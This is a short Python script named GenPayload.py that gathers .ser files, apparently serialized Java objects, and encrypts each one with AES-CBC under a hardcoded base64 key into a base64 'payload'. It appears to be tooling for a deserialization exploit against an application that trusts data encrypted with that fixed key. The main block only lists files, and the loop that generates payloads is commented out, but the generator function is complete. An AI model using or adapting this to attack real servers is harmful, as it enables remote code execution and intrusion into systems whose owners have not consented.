#!/usr/bin/python3
# -*- coding: utf-8 -*-
# @Time    : 2020/9/10 9:33 下午
# @Author  : Veraxy
# @FileName: GenPayload.py
# @Software: PyCharm
import uuid
import base64
from Crypto.Cipher import AES
import os
curPath = os.path.abspath(os.path.dirname(__file__))
rootPath = os.path.split(curPath)[0]

def Getdir():
    dirlist = []
    for parent, dirnames, filenames in os.walk('./ser'):
        for filename in filenames:
            if filename.endswith('.ser'):
                dirlist.append(os.path.join(parent, filename))
    return dirlist

def Genpayload(filepath,key):
    f = open(filepath,'rb')
    BS = AES.block_size
    pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode()
    key = base64.b64decode(key)
    iv = uuid.uuid4().bytes
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    file_body = pad(f.read())
    base64_ciphertext = base64.b64encode(iv + encryptor.encrypt(file_body))
    payload = str(base64_ciphertext, encoding='utf-8')
    return payload

if __name__ == '__main__':
    # key = sys.argv[1]
    key = 'kPH+bIxk5D2deZiIxcaaaA=='
    print(Getdir())
    # for dir in Getdir():
    #     print(dir)
    #     Genpayload(dir,key)
